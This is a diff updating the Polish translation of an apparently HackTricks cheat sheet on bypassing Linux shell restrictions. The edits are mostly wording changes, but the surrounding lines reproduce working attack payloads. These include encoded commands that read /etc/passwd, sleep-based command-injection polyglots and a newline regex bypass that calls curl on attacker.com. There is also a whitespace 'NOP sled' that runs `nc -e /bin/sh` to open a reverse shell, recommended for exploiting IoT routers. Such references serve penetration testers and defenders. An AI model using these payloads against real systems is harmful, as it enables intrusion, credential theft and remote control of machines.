@@ -1,8 +1,8 @@
-# Omijanie ograniczeń Linux
+# Omijanie ograniczeń Linuksa
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Typowe sposoby omijania ograniczeń
+## Omijanie typowych ograniczeń
 
 ### Reverse Shell
 ```bash
@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Obchodzenie zakazanych spacji
+### Omijanie zablokowanych spacji
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -110,11 +110,11 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass potoków
+### Obchodzenie potoków
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Obejście z użyciem kodowania szesnastkowego
+### Obejście za pomocą kodowania szesnastkowego
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -138,14 +138,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### Eksfiltracja danych przez DNS
+### Eksfiltracja danych DNS
 
 Możesz na przykład użyć **burpcollab** lub [**pingb**](http://pingb.in).
 
 ### Builtins
 
-Jeśli nie możesz wykonywać zewnętrznych funkcji i masz dostęp tylko do **ograniczonego zestawu builtins umożliwiających uzyskanie RCE**, istnieje kilka przydatnych trików, które możesz wykorzystać. Zwykle **nie będziesz w stanie użyć wszystkich** elementów **builtins**, dlatego warto **znać wszystkie dostępne opcje**, aby spróbować ominąć jail. Pomysł pochodzi od [**devploit**](https://twitter.com/devploit).\
-Najpierw sprawdź wszystkie [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Następnie skorzystaj z poniższych **rekomendacji**:
+Jeśli nie możesz wykonywać zewnętrznych funkcji i masz dostęp tylko do **ograniczonego zestawu builtins umożliwiających uzyskanie RCE**, istnieje kilka przydatnych trików, które możesz zastosować. Zwykle **nie będziesz mieć możliwości użycia wszystkich** **builtins**, dlatego powinieneś **znać wszystkie dostępne opcje**, aby spróbować ominąć jail. Pomysł pochodzi od [**devploit**](https://twitter.com/devploit).\
+Najpierw sprawdź wszystkie [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Następnie znajdziesz tutaj kilka **rekomendacji**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Omijanie potencjalnych wyrażeń regularnych
+### Obchodzenie potencjalnych wyrażeń regularnych
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -259,7 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### RCE z 4 znakami
+### RCE za pomocą 4 znaków
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -294,17 +294,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Read-Only/Noexec/Distroless Bypass
+## Obejście zabezpieczeń Read-Only/Noexec/Distroless
 
-Jeśli znajdujesz się wewnątrz systemu plików z ochroną **read-only i noexec** lub nawet w kontenerze distroless, nadal istnieją sposoby na **wykonywanie dowolnych plików binarnych, a nawet shell!:**
-
+Jeśli znajdujesz się w systemie plików z zabezpieczeniami **read-only i noexec** albo nawet w kontenerze distroless, nadal istnieją sposoby na **wykonywanie dowolnych plików binarnych, a nawet shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
-
+## Obejście Chroot i innych Jaili
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -312,31 +310,30 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Gdy podatność pozwala na częściową kontrolę nad argumentem, który ostatecznie trafia do `system()` lub innego shell, możesz nie znać dokładnego offsetu, od którego rozpocznie się odczytywanie payloadu. Tradycyjne NOP sleds (np. `\x90`) **nie** działają w składni shell, ale Bash bezpiecznie zignoruje początkowe białe znaki przed wykonaniem polecenia.
+Gdy podatność pozwala na częściową kontrolę nad argumentem, który ostatecznie trafia do `system()` lub innego shell, możesz nie znać dokładnego offsetu, od którego wykonywanie zacznie odczytywać twój payload. Tradycyjne NOP sleds (np. `\x90`) **nie** działają w składni shell, ale Bash bezpiecznie zignoruje początkowe białe znaki przed wykonaniem polecenia.
 
-Dlatego możesz utworzyć *NOP sled dla Bash*, poprzedzając właściwe polecenie długą sekwencją spacji lub znaków tabulacji:
+Dlatego możesz utworzyć *NOP sled dla Bash*, poprzedzając właściwe polecenie długą sekwencją spacji lub znaków tabulacji:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Jeśli łańcuch ROP (lub dowolny primitive związany z korupcją pamięci) ustawi instruction pointer w dowolnym miejscu w bloku spacji, parser Bash po prostu pominie białe znaki, aż dotrze do `nc`, niezawodnie wykonując polecenie.
+Jeśli łańcuch ROP (lub dowolny primitive korupcji pamięci) ustawi instruction pointer w dowolnym miejscu w bloku spacji, parser Bash po prostu pomija białe znaki, aż dotrze do `nc`, niezawodnie wykonując polecenie.
 
 Praktyczne zastosowania:
 
-1. **Bloby konfiguracji mapowane w pamięci** (np. NVRAM), dostępne między procesami.
+1. **Bloby konfiguracyjne mapowane w pamięci** (np. NVRAM), które są dostępne między procesami.
 2. Sytuacje, w których attacker nie może zapisywać bajtów NULL w celu wyrównania payloadu.
-3. Embedded devices, w których dostępne są tylko BusyBox `ash`/`sh` – one również ignorują początkowe spacje.
+3. Embedded devices, w których dostępny jest tylko BusyBox `ash`/`sh` – one również ignorują początkowe spacje.
 
-> 🛠️  Połącz ten trick z gadżetami ROP wywołującymi `system()`, aby znacznie zwiększyć niezawodność exploita na routerach IoT z ograniczoną pamięcią.
+> 🛠️  Połącz tę sztuczkę z gadżetami ROP wywołującymi `system()`, aby znacznie zwiększyć niezawodność exploita na routerach IoT z ograniczoną pamięcią.
 
-## Referencje i więcej
+## Referencje
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
